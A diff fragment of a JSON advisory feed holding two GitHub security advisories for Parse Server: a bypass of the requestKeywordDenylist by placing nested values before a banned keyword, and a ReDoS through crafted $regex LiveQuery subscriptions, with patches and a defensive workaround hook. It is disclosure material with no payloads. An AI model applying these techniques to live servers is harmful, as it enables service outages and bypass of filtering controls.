+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-q342-9w2p-57fp"
+          ],
+          "content_hash": "sha256:67b76a7d789f125162828e44c12cd63f25edb1795f326e98bd302e56ffffaa28"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>requestKeywordDenylist</code> security control can be bypassed by placing any nested object or array before a prohibited keyword in the request payload. This is caused by a logic bug that stops scanning sibling keys after encountering the first nested value. Any custom <code>requestKeywordDenylist</code> entries configured by the developer are equally by-passable using the same technique.</p>\n<p>All Parse Server deployments are affected. The <code>requestKeywordDenylist</code> is enabled by default.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The fix replaces the recursive object scanner with an iterative stack-based traversal that processes all nested values without prematurely exiting the scan loop. This also eliminates a potential stack overflow on deeply nested payloads.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use a Cloud Code <code>beforeSave</code> trigger to validate incoming data for prohibited keywords across all classes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp\">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.12\">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp\">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.12\">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1\">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30938\">https://nvd.nist.gov/vuln/detail/CVE-2026-30938</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q342-9w2p-57fp\">https://github.com/advisories/GHSA-q342-9w2p-57fp</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:44:49.000Z",
+          "date_published": "2026-03-10T00:57:37.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-q342-9w2p-57fp"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "1b3219a0a323f70e270d5963cc98c47c",
+        "url": "https://github.com/advisories/GHSA-mf3j-86qx-cq5j",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[parse-server] Parse Server has Regular Expression Denial of Service (ReDoS) via `$regex` query in LiveQuery",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-11T00:24:39Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-mf3j-86qx-cq5j"
+          ],
+          "content_hash": "sha256:de8276e47eeb1c9b5cab018364ee28d080c75b5855b3d92edfc2a612eb7c8e39"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A malicious client can subscribe to a LiveQuery with a crafted <code>$regex</code> pattern that causes catastrophic backtracking, blocking the Node.js event loop. This makes the entire Parse Server unresponsive, affecting all clients. Any Parse Server deployment with LiveQuery enabled is affected. The attacker only needs the application ID and JavaScript key, both of which are public in client-side apps.</p>\n<p>This only affects LiveQuery subscription matching, which evaluates regex in JavaScript on the Node.js event loop. Normal REST and GraphQL queries are not affected because their regex is evaluated by the database engine.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Regex evaluation in LiveQuery subscription matching now runs in an isolated VM context with a configurable timeout via a new Parse Server option `liveQuery.regexTimeout, with defaults 100 ms. A regex that exceeds the timeout is treated as non-matching.</p>\n<p>The protection adds approximately 50 microseconds of overhead per regex evaluation. For most applications this is negligible, but it can add up if there is a very large number of LiveQuery subscriptions that use <code>$regex</code> on the same class. For example, 10,000 concurrent regex subscriptions would add approximately 500ms of processing time per object save event on that class. Set <code>liveQuery.regexTimeout: 0</code> to disable the protection and use native regex evaluation without overhead.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Use the <code>beforeSubscribe</code> Cloud Code hook to reject any LiveQuery subscription that contains a <code>$regex</code> operator. Note that this also blocks the LiveQuery <code>startsWith</code>, <code>endsWith</code>, and <code>contains</code> query methods, as they use <code>$regex</code> internally.</p>\n<pre><code class=\"language-js\">// Repeat for each class that is used with LiveQuery\nParse.Cloud.beforeSubscribe('MyClass', request =&gt; {\n  const where = request.query._where || {};\n  for (const value of Object.values(where)) {\n    if (value?.$regex) {\n      throw new Parse.Error(Parse.Error.OPERATION_FORBIDDEN, '$regex not allowed in LiveQuery subscriptions');\n    }\n  }\n});\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GitHub security advisory: <a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j\">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>\n<li>Fix Parse Server 9: <a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14\">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>\n<li>Fix Parse Server 8: <a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.11\">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j\">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/8.6.11\">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>\n<li><a href=\"https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14\">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-30925\">https://nvd.nist.gov/vuln/detail/CVE-2026-30925</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mf3j-86qx-cq5j\">https://github.com/advisories/GHSA-mf3j-86qx-cq5j</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T18:44:30.000Z",
+          "date_published": "2026-03-10T00:57:18.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-mf3j-86qx-cq5j"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      }
+    ],
+    "updated": [],
+    "removed": []
+  },
+  "counts": {
+    "items": 20,
+    "updated": 0,
+    "removed": 0
+  },
+  "integrity_reset": true
+}
